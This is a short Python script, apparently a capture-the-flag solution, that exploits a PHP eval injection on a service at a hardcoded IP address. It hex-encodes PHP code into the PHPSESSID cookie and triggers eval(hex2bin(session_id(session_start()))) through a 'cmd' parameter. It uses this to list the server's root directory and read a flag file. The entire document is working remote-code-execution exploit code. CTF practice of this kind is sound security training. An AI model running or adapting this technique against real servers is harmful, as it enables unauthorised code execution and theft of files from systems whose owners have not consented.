import requests
import binascii

URL = 'http://34.124.157.127:9001/'

def bin2hex(str1):
    bytes_str = bytes(str1, 'utf-8')
    return binascii.hexlify(bytes_str)

def findFlag():
    params = {"cmd":"eval(hex2bin(session_id(session_start())))"}
    payload = bin2hex('print_r(scandir("/"));').decode()
    cookies = {"PHPSESSID":payload}
    print(requests.get(URL,params=params,cookies=cookies).text)

def readFlag():
    params = {"cmd":"eval(hex2bin(session_id(session_start())))"}
    payload = bin2hex('readfile("/fl4g_r3al_h3he.txt");').decode()
    cookies = {"PHPSESSID":payload}
    print("Flag: ",requests.get(URL,params=params,cookies=cookies).text)

if __name__ == '__main__':
    findFlag()
    readFlag()
    
